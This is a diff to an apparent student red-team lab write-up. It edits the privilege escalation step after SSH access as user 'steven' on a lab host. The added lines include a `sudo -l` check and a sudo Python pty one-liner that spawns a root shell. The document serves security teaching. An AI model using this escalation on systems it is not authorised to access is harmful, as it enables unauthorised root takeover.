@@ -146,17 +146,17 @@ In the next step, I will utilise this newly cracked password to SSH into **steve
   
   Fig. 14: SSH into **steven**'s account.
 
-Since SSH is successful, the next step would be to perform privilege escalation. In this step, I will utilize a _Python_ script. 
+Since SSH is successful, the next step would be to perform privilege escalation. 
 
 - Commands: 
-  - `$ ssh steven@192.168.1.110`
+  - `$ sudo -l`
+  - `$ sudo python -c 'import pty;pty.spawn("/bin/bash")'`
 
 - Output: 
-
-  <img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%2018.%20Performing%20Privilege%20Escalation.PNG" width="500" height="350">
+<img src="https://github.com/NZS-USYD/CySec-Project-3-/blob/main/Red%20Team%20Operations/Fig.%2018.%20Performing%20Privilege%20Escalation.PNG" width="500" height="350">
   
-  Fig. 15:.
+  Fig. 15: Leveraging a _Python_ permission, the user **steven** escaletes its privilege to `root`.
 
 
-
+In this step, I will utilize a _Python_ script.
    
